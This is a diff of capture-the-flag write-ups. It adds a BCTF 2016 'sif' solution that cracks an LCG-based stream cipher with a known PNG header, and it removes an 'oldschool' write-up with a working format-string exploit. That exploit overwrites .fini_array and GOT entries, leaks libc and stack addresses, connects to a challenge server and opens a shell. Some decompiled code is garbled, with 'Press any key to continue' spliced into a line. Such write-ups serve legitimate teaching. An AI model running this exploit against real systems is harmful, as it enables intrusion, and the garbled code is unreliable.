+        if (this.fileobj.eos())
+        {
+        }
+        else
+        {
+            if (this.pos == 0)
+            {
+                local rk = resume this.mana;
+                  // [043]  OP_NEWOBJ         6         4    0    1
+                $[stack offset 6].append($[stack offset 6], rk << 40);
+                $[stack offset 6].append($[stack offset 6], rk << 32);
+                $[stack offset 6].append($[stack offset 6], rk << 24);
+                $[stack offset 6].append($[stack offset 6], rk << 16Press any key to continue . . . 
+);
+                this.cur = $[stack offset 6];
+            }
+
+            result.writen(this.fileobj.readn(98) ^ this.cur[this.pos], 98);
+            this.pos = this.pos + 1 & 3;
+            i++;
+              // [076]  OP_JMP            0       -47    0    0
+        }
+    }
+
+    return result;
+};
+```
+
+We can see the `header` is written to the output (meaning the first 8 bytes of the file are the first 8 bytes of the `md5` digest) after which we iterate over the plaintext. A counter named `pos` is maintained which loops from 0 to 3 and whenever it is 0 it will tap the LCG, extract its value and construct a 4-element array consisting of the LCG value bitshifted with various values. The current plaintext byte is always XORed with the value in this array at index `pos`, making the encryption algorithm a simple streamcipher using the `rand48` LCG as its PRNG. Again a fault in the decompiler kicks in here since a keen eye will spot the senselessness of the leftwise bitshifts given that they only introduce nullbytes in the least significant bits of the value and we only use the least significant byte of each of those values. Hence we assumed this was a bug in the decompiler and changed the leftshifts to rightshifts.
+
+Now we can put the above all together to start cracking the cipher:
+
+* We know every 4 bytes of ciphertext are the result of 4 bytes of plaintext XORed with the least significant bytes of an array that looks like this `[(mana >> 40), (mana >> 32), (mana >> 24), (mana >> 16)]`
+
+* Since we are dealing with a PNG file we can assume it has a fixed file header of 8 known bytes (being `"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A"` and starting at offset 8 in the target file, after the md5 header) which allows us to use a known plaintext attack to derive 8 bytes of keystream using `xor(ciphertext[8:16], png_header)`
+
+* The 8 bytes of keystream contain 2 (partial) LCG output values. We know the LCG outputs 48-bit values so we know:
+
+```
+keystream[0] = rk1[48..40]
+keystream[1] = rk1[40..32]
+keystream[2] = rk1[32..24]
+keystream[3] = rk1[24..16]
+keystream[4] = rk2[48..40]
+keystream[5] = rk2[40..32]
+keystream[6] = rk2[32..24]
+keystream[7] = rk2[24..16]
+```
+
+Which means we have the upper 32 bits of LCG output 1 and 2 (dubbed rk1 and rk2) and miss the lower 16 bits. We can partially reconstruct `rk1` and `rk2` by reversing the bitshifts:
+
+```python
+rk1 = ((keystream[0] << 40) | (keystream[1] << 32) | (keystream[2] << 24) | (keystream[3] << 16))
+rk2 = ((keystream[4] << 40) | (keystream[5] << 32) | (keystream[6] << 24) | (keystream[7] << 16))
+```
+
+* We also know `rk1` is the seed to the LCG so if we manage to fully reconstruct `rk1` we can clone the LCG and reproduce the full keystream to recover the original plaintext. We can recover `rk1` by brute-forcing its lower 16 bits and checking for which value `((lcg_step(rk1 | candidate) & 0xFFFFFFFF0000) == rk2)` holds, ie. which value is the preceding value to the second recovered LCG output.
+
+Tying this all together in our [cracking script looks as follows](solution/sif_crack.py):
+
+```python
+#!/usr/bin/python
+#
+# BCTF 2016
+# sif (REVERSING/350)
+#
+# @a: Smoke Leet Everyday
+# @u: https://github.com/smokeleeteveryday
+#
+
+import hashlib
+from struct import pack, unpack
+
+def magic_step(x):
+    A = 0x5DEECE66D
+    B = 0xB
+    M = ((1 << 48) - 1)
+    return (((x * A) + B) & M)
+
+class magic:
+    def __init__(self, seed):
+        self.x = seed
+        return
+
+    def step(self):
+        old_x = self.x
+        self.x = magic_step(self.x)
+        return old_x
+
+def xor_strings(xs, ys):
+    return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))
+
+def recover_mana(keystream_slice):
+    assert (len(keystream_slice) == 4)
+    mana_lsbs = [ord(x) for x in list(keystream_slice)]
+    return ((mana_lsbs[0] << 40) | (mana_lsbs[1] << 32) | (mana_lsbs[2] << 24) | (mana_lsbs[3] << 16))
+
+def decrypt(ciphertext, seed):
+    plaintext = ''
+    pos = 0
+    m = magic(seed)
+    for i in xrange(len(ciphertext)):
+        if (pos == 0):
+            rk = m.step()
+            cur = [(rk >> 40), (rk >> 32), (rk >> 24), (rk >> 16)]
+        plaintext += chr(ord(ciphertext[i]) ^ (cur[pos] & 0xFF))
+        pos = ((pos + 1) & 3)
+    return plaintext
+
+def mana_check(mana1, mana2):
+    i = 0
+    print "[*] Checking mana..."
+    while(i < 2**16):
+        candidate = (mana1 | i)
+        if ((magic_step(candidate) & 0xFFFFFFFF0000) == (mana2 & 0xFFFFFFFF0000)):
+            return candidate
+
+        i += 1
+
+    raise Exception("[-] Couldn't check LCG outputs...")
+    return
+
+ciphertext = open('flag.png', 'rb').read()
+known_png_header = "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A"
+crypto_header = ciphertext[0:8]
+cipher_png_header = ciphertext[8:8+len(known_png_header)]
+keystream = xor_strings(cipher_png_header, known_png_header)
+
+print "[+] crypto header: [%s]" % (crypto_header.encode('hex'))
+print "[+] derived keystream: [%s]" % (keystream.encode('hex'))
+
+mana1 = recover_mana(keystream[0:4])
+mana2 = recover_mana(keystream[4:8])
+
+print "[+] recovered (partial) LCG output 1: [%s]" % ('{:012x}'.format(mana1))
+print "[+] recovered (partial) LCG output 2: [%s]" % ('{:012x}'.format(mana2))
+
+seed = mana_check(mana1, mana2)
+
+print "[+] cracked LCG seed: [%s]" % ('{:08x}'.format(seed))
+
+open('plaintext_flag.png', 'wb').write(decrypt(ciphertext[8:], seed))
+print "[+] decrypted flag.png!"
+```
+
+Which, when running, gives us:
 
 ```bash
-$ readelf -S ./oldschool
-There are 30 section headers, starting at offset 0x102c:
-
-Section Headers:
-  (...)
-  [18] .init_array       INIT_ARRAY      080496d8 0006d8 000004 00  WA  0   0  4
-  [19] .fini_array       FINI_ARRAY      080496dc 0006dc 000004 00  WA  0   0  4
+$ ./sif_crack.py
+[+] crypto header: [99c3f1d5f20c2317]
+[+] derived keystream: [0c3e6181fdc88e94]
+[+] recovered (partial) LCG output 1: [0c3e61810000]
+[+] recovered (partial) LCG output 2: [fdc88e940000]
+[*] Checking mana...
+[+] cracked LCG seed: [c3e618181ea]
+[+] decrypted flag.png!
 ```
 
-Before it transfers control to an application the runtime linker processes initialization sections (.preinit_array, .init_array, .init) found in the application and its loaded libraries and when the application terminates the runtime linker processes its termination sections (.fini_array, .fini). These sections are effectively arrays of function pointers which point to the functions that are to be executed by the runtime linker:
+Which yields a QR code image containing the flag:
 
-```asm
-.fini_array:080496DC _fini_array     segment dword public 'DATA' use32
-.fini_array:080496DC                 assume cs:_fini_array
-.fini_array:080496DC                 ;org 80496DCh
-.fini_array:080496DC __do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux
 ```
-
-As we can see `.fini_array` holds the address of a destructor function which will be executed when the application terminates. So if we use our fms to overwrite the `.fini_array` entry with an address of our choice we can hijack EIP control upon application termination.
-
-The next step is to determine where to redirect EIP control to. Since the application is compiled with `NX` support we will need to conduct some kind of ROP (or subclass thereof, like ret2libc) attack but in order to do that we will need to bypass ASLR which in this case requires an infoleak. Luckily we have a format string vulnerability in the target application which always functions leak an infoleak due to the ability for stack value disclosure.
-
-Hence if we overwrite `.fini_array` with the start address of the target application's `main` routine upon termination the application will effectively 'restart' again and allow us to exploit the fms vulnerability a second time. This way we can include an infoleak in the first fms exploitation string from which we can derive the addresses required to craft a full ROP chain in the second fms exploitation string.
-
-Now we have to ask ourselves how we will exploit the fms vulnerability the second time to pop a shell. Since we now have bypassed ASLR using our infoleak we will target the GOT entry of `printf` because if we manage to overwrite it with the address of the `system` function and redirect control flow back to the `main` routine a third time we end up with a situation where `printf` is called over our `user_input` which will actually come down to `system(user_input)`. In addition to overwriting the GOT entry of `printf` here we also need to make sure execution 'loops back' to the `main` routine's start address a third time to actually trigger the call to `system`. We do this by overwriting the GOT entry of `___stack_chk_fail` (since overwriting `.fini_array` a second time didn't work here) and writing garbage to the address of the saved stack cookie so that, upon exiting the main routine, the stack cookie protection mechanism will think a stack smashing attack has been carried out and call `___stack_chk_fail` which will effectively redirect control to `main` a third time.
-
-In order to facilitate the above we will need to leak the following pointers:
-
-* A pointer into libc
-* A pointer into the stack
-
-We can find a pointer into libc quite easily when inspecting the stack at the epilogue of the `main` routine:
-
-```asm
-  gdb-peda$ x/300xw $esp
-  0xbffff870: 0xbffff88c  0x000003fc  0xb7fcfc00  0x00000006
-  (...)
-  0xbffffc90: 0xbffffcb0  0x00000000  0x00000000  0xb7e7b723
-  0xbffffca0: 0x08048540  0x00000000  0x00000000  0xb7e7b723
-  0xbffffcb0: 0x00000001  0xbffffd44  0xbffffd4c  0xb7fed7da
-  0xbffffcc0: 0x00000001  0xbffffd44  0xbffffce4  0x080497ec
-  0xbffffcd0: 0x08048230  0xb7fcf000  0x00000000  0x00000000
-  0xbffffce0: 0x00000000  0xdffeebbc  0xef6a4fac  0x00000000
-  0xbffffcf0: 0x00000000  0x00000000  0x00000001  0x080483a0
-  0xbffffd00: 0x00000000  0xb7ff3020  0xb7e7b639  0xb7fff000
-  0xbffffd10: 0x00000001  0x080483a0  0x00000000  0x080483c1
-  gdb-peda$ disas 0xb7e7b723,+10
-  Dump of assembler code from 0xb7e7b723 to 0xb7e7b72d:
-     0xb7e7b723 <__libc_start_main+243>:  mov    DWORD PTR [esp],eax
-     0xb7e7b726 <__libc_start_main+246>:  call   0xb7e92c00 <__GI_exit>
-     0xb7e7b72b <__libc_start_main+251>:  xor    ecx,ecx
-  End of assembler dump.
-```
-
-Here we can see the return address of `main()` back into the `__libc_start_main` routine. Note that the above is a stackdump on our local test machine with a different libc version so the offset of the pointer to the libc base address is slightly different but this can be calculated by finding the address of the equivalent return point into `__libc_start_main` in the supplied `libc-2.21.so` library. We can find a pointer into the stack in a similar fashion and determine its offset to the saved cookie to obtain its stack storage address. We can leak both pointers by exploiting the fms vulnerability using `%index$x` where index is the DWORD-offset on the stack of our target.
-
-## Stage 1
-
-Stage 1 of the attack consists of transforming the fms vulnerability into a reliable infoleak which is done as follows:
-
-```python
-  # offset of our dst_addr in our buffer (in DWORDs)
-  offset_1 = 7 + 4
-  # libc pointer leak offset (in DWORDs)
-  offset_2 = 267
-  # stack pointer leak offset (in DWORDs)
-  offset_3 = 264
-
-  # .fini_array address
-  dst_addr = 0x080496DC
-  # <main+0> address
-  lsb_overwrite = 0x849B
-  # how many bytes to output to set internal written counter to lsb_overwrite
-  val = (lsb_overwrite - (16 + 4))
-
-  # Construct FMS exploit string
-  return chr(0x25) + str(offset_2) + '$08x' + chr(0x25) + str(offset_3) + '$08x' + pack('<I', dst_addr) + chr(0x25) + str(val) + 'x' + chr(0x25) + str(offset_1) + '$hn.'
-```
-
-Which constructs the fms exploit string `%267$08x%264$08x[.fini_array_lsb_address]%valx%11$hn.` which executes a short-write (ie. it writes the number of bytes printed by the fms as a short to the target address). Note that in the above we only have to overwrite the least significant 16 bits of the pointer stored at `.fini_array` since the original pointer and the overwriting pointer are both function pointers to the target application.
-
-## Stage 2
-
-When we have the leaked pointers we can determine the stack cookie address and address of `system()` and execute our stage 2:
-
-```python
-def construct_stage_2(stackcookie_addr, system_addr):
-  # Offsets of first 3 DWORDs of our buffer on stack and the saved stack cookie (in DWORDs)
-  offset = [7, 8, 9, 10]
-
-  # .got:__stack_chk_fail address
-  dst_addr_1 = 0x080497E4
-  # <main+0> address
-  main_lsb = 0x849B
-
-  # .got:printf address
-  dst_addr_2 = 0x080497DC
-  # __libc_system address
-  # LSBs and MSBs are written seperately in short writes
-  system_lsb = (system_addr & 0x0000FFFF)
-  system_msb = ((system_addr & 0xFFFF0000) >> 16)
-
-  # Addresses to write to
-  adr = [0, 0, 0, 0]
-  # Values to print to adjust internal output counter for writing
-  val = [0, 0, 0, 0]
-
-  # these bytes will have been already output (for addresses) upon first fms output
-  already_written = (4 * 4)
-
-  # We write in ascending order of size
-  # main_lsb is smallest
-  if ((main_lsb < system_lsb) and (main_lsb < system_msb)):
-    # write main_lsb first
-    adr[0] = (dst_addr_1)
-    val[0] = (main_lsb - already_written)
-
-    if (system_lsb < system_msb):
-      # write system_lsb next
-      adr[1] = (dst_addr_2)
-      val[1] = (system_lsb - main_lsb)
-
-      adr[2] = (dst_addr_2 + 2)
-      val[2] = (system_msb - system_lsb)
-    else:
-      # write system_msb next
-      adr[1] = (dst_addr_2 + 2)
-      val[1] = (system_msb - main_lsb)
-
-      adr[2] = (dst_addr_2)
-      val[2] = (system_lsb - system_msb)
-
-  # system_lsb is smallest
-  elif ((system_lsb < main_lsb) and (system_lsb < system_msb)):
-    # write system_lsb first
-    adr[0] = (dst_addr_2)
-    val[0] = (system_lsb - already_written)
-
-    if (main_lsb < system_msb):
-      # write main_lsb next
-      adr[1] = (dst_addr_1)
-      val[1] = (main_lsb - system_lsb)
-
-      adr[2] = (dst_addr_2 + 2)
-      val[2] = (system_msb - main_lsb)
-    else:
-      # write system_msb next
-      adr[1] = (dst_addr_2 + 2)
-      val[1] = (system_msb - system_lsb)
-
-      adr[2] = (dst_addr_1)
-      val[2] = (main_lsb - system_msb)
-
-  # system_msb is smallest
-  elif ((system_msb < main_lsb) and (system_msb < system_lsb)):
-    # write system_msb first
-    adr[0] = (dst_addr_2 + 2)
-    val[0] = (system_msb - already_written)
-
-    if (main_lsb < system_lsb):
-      # write main_lsb next
-      adr[1] = (dst_addr_1)
-      val[1] = (main_lsb - system_msb)
-
-      adr[2] = (dst_addr_2)
-      val[2] = (system_lsb - main_lsb)
-    else:
-      # write system_lsb next
-      adr[1] = (dst_addr_2)
-      val[1] = (system_lsb - system_msb)
-
-      adr[2] = (dst_addr_1)
-      val[2] = (main_lsb - system_lsb)
-
-  # Set up clobbering of saved stack cookie
-  adr[3] = stackcookie_addr
-
-  if ((val[2] & 0xFF) != 0):
-    if ((val[2] & 0xFF) == 0xFF):
-      val[3] = 2
-    else:
-      val[3] = 1
-  else:
-    val[3] = 1
-  return pack('<I', adr[0]) + pack('<I', adr[1]) + pack('<I', adr[2]) + pack('<I', adr[3]) + chr(0x25) + str(val[0]) + 'x' + chr(0x25) + str(offset[0]) + '$hn'  + chr(0x25) + str(val[1]) + 'x' + chr(0x25) + str(offset[1]) + '$hn'  + chr(0x25) + str(val[2]) + 'x' + chr(0x25) + str(offset[2]) + '$hn' + chr(0x25) + str(offset[3]) + '$hn'
-```
-
-Here we overwrite the LSBs of `.got:__stack_chk_fail` with the LSBs of `main()`, overwrite `.got:printf` with the address of `system()` and overwrite the saved stack cookie with junk (note that this can be anything as long as its least significant byte is not 0x00 because stack cookie generation makes sure a stack cookie always has 0x00 as its least significant byte to complicate stack buffer overflow exploitation efforts).
-
-There is some minor headache involved here because the nature of the format string `%n` and `%hn` specifiers mean that we always write the number of bytes printed so far to the target address which means that if we want to write a small and a large value we need to write the small value first and then the large value. As such we sort the order of address we write to and the values we write to them (rather inefficiently). Obviously the right way to go about doing this is by simply sorting an array of (address, value) tuples in ascending order on the value field but oh well.
-
-## Putting it all together
-
-Now that we have our exploit-generation code for the two stages we can [put it all together as follows](solution/oldschool_sploit.py):
-
-```python
-cmd = '/bin/sh'
-libc_offsets = {'2.21': {'libc_start_main_ret': 0x0001873E, 'system': 0x0003B180}}
-version = '2.21'
-libc_start_main_ret_offset = libc_offsets[version]['libc_start_main_ret']
-system_offset = libc_offsets[version]['system']
-cookie_ptr_offset = (0xF8 + 0xC)
-
-host = '175.119.158.131'
-port = 17171
-
-h = remote(host, port, timeout = None)
-
-print "[*] Executing stage 1..."
-
-libc_base_addr, stackcookie_addr = stage_1(h)
-libc_base_addr = (libc_base_addr - libc_start_main_ret_offset)
-system_addr = (libc_base_addr + system_offset)
-stackcookie_addr = (stackcookie_addr - cookie_ptr_offset)
-
-print "[+] Got libc base address: [%x]" % libc_base_addr
-print "[+] Got system() address: [%x]" % system_addr
-print "[+] Got stack cookie address: [%x]" % stackcookie_addr
-
-print "[*] Executing stage 2..."
-
-stage_2(h, stackcookie_addr, system_addr, cmd)
-
-h.close()
-```
-
-Which, when executed, gives us:
-
-```bash
-$ ./oldschool_sploit.py 
-[+] Opening connection to 175.119.158.131 on port 17171: Done
-[*] Executing stage 1...
-[+] Got libc base address: [b754e000]
-[+] Got system() address: [b7589180]
-[+] Got stack cookie address: [bfd7c41c]
-[*] Switching to interactive mode
-
-     sh: 1: YOUR: not found
-sh: 1: RESPONSE: not found
-$ id
-uid=1001(oldschool) gid=1001(oldschool) groups=1001(oldschool)
-$ ls -la
-total 77
-drwxr-xr-x  21 root root  4096 Mar  8 14:37 .
-drwxr-xr-x  21 root root  4096 Mar  8 14:37 ..
-drwxr-xr-x   2 root root  4096 Mar  8 15:40 bin
-drwxr-xr-x   4 root root  1024 Mar  8 14:44 boot
-drwxr-xr-x  19 root root  4320 Mar 13 03:27 dev
-drwxr-xr-x  94 root root  4096 Mar 12 22:22 etc
-drwxr-xr-x   4 root root  4096 Mar 12 22:13 home
-lrwxrwxrwx   1 root root    32 Mar  8 14:37 initrd.img -> boot/initrd.img-4.2.0-16-generic
-drwxr-xr-x  20 root root  4096 Mar  8 15:39 lib
-drwx------   2 root root 16384 Mar  8 14:36 lost+found
-drwxr-xr-x   3 root root  4096 Mar  8 14:37 media
-drwxr-xr-x   2 root root  4096 Oct 19 18:14 mnt
-drwxr-xr-x   2 root root  4096 Oct 22 02:27 opt
-dr-xr-xr-x 160 root root     0 Mar 10 21:29 proc
-drwx------   2 root root  4096 Mar  8 14:36 root
-drwxr-xr-x  22 root root   780 Mar 13 19:01 run
-drwxr-xr-x   2 root root  4096 Mar  8 15:40 sbin
-drwxr-xr-x   2 root root  4096 Oct 22 02:27 srv
-dr-xr-xr-x  13 root root     0 Mar 12 22:00 sys
-drwxrwxrwt   8 root root  4096 Mar 13 23:17 tmp
-drwxr-xr-x  10 root root  4096 Mar  8 14:36 usr
-drwxr-xr-x  12 root root  4096 Mar  8 14:43 var
-lrwxrwxrwx   1 root root    29 Mar  8 14:37 vmlinuz -> boot/vmlinuz-4.2.0-16-generic
-$ ls -la /home/oldschool
-total 40
-drwxr-xr-x 3 root      root      4096 Mar 13 00:12 .
-drwxr-xr-x 4 root      root      4096 Mar 12 22:13 ..
--rw-r--r-- 1 root      root        20 Mar 12 23:10 6a39364a7346534d16ca88ae39d20f27_flag.txt
--rw-r--r-- 1 oldschool oldschool  220 Mar 12 22:13 .bash_logout
--rw-r--r-- 1 oldschool oldschool 3771 Mar 12 22:13 .bashrc
-drwx------ 2 oldschool oldschool 4096 Mar 12 22:14 .cache
--rwxr-xr-x 1 root      root      5340 Mar 11 00:50 oldschool
--rw-r--r-- 1 root      root      1648 Mar 11 00:50 oldschool.c
--rw-r--r-- 1 oldschool oldschool  675 Mar 12 22:13 .profile
-$ cat /home/oldschool/6a39364a7346534d16ca88ae39d20f27_flag.txt
-R3st_1n_P34c3_FSB:(
+BCTF{550_loveca_w1th0ut_UR}
 ```
